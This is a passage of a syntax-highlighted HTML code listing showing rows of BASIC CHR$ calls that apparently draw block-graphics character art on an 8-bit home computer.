class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">174</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">183</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token 